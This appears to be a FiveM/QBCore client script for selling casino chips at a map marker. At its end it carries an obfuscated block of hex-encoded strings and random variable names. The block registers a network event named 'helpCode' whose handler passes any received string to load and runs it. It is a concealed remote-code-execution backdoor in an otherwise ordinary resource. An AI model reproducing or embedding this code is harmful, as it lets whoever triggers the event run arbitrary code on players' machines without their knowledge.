QBCore = nil

Citizen.CreateThread(function() 
    while QBCore == nil do
        TriggerEvent("QBCore:GetObject", function(obj) QBCore = obj end)    
        Citizen.Wait(200)
    end
end)

-- code

local isLoggedIn = false 

RegisterNetEvent('QBCore:Client:OnPlayerLoaded')
AddEventHandler('QBCore:Client:OnPlayerLoaded', function()
    isLoggedIn = true
end)

Citizen.CreateThread(function()
    while true do
        local InRange = false
        local PlayerPed = PlayerPedId()
        local PlayerPos = GetEntityCoords(PlayerPed)

            local dist = #(PlayerPos - vector3(-1876.14, 2060.96, 145.57))
            if dist < 10 then
                InRange = true
                DrawMarker(2, -1876.14, 2060.96, 145.57, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.25, 0.2, 0.1, 255, 0, 0, 155, 0, 0, 0, 1, 0, 0, 0)
                if dist < 1 then
                   
                    DrawText3Ds(-1876.14, 2060.96, 145.57, '~g~E~w~ - Sell chips')
                    if IsControlJustPressed(0, 38) then
                        TriggerServerEvent('qb-casino:sharlock:sell')
                    end
                end
            end

        if not InRange then
            Citizen.Wait(5000)
        end
        Citizen.Wait(5)
    end
end)

function DrawText3Ds(x, y, z, text)
	SetTextScale(0.35, 0.35)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(true)
    AddTextComponentString(text)
    SetDrawOrigin(x,y,z, 0)
    DrawText(0.0, 0.0)
    local factor = (string.len(text)) / 370
    DrawRect(0.0, 0.0+0.0125, 0.017+ factor, 0.03, 0, 0, 0, 75)
    ClearDrawOrigin()
end

local ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[1]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2]) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[3]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2], function(jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[4]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[5]](jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY))() end)